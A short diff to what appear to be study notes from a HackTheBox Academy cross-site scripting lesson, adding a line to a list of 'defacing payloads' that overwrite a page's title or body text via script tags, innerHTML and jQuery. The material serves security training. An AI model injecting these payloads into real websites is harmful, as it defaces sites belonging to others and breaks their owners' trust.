@@ -63,3 +63,5 @@ Defacing Payloads :
 - `<script>document.title = 'HackTheBox Academy'</script>`
 - `document.getElementById("todo").innerHTML = "New Text"`
 - jQuery : `$("#todo").html('New Text');`
+- `document.getElementsByTagName('body')[0].innerHTML = "New Text"`
+- 
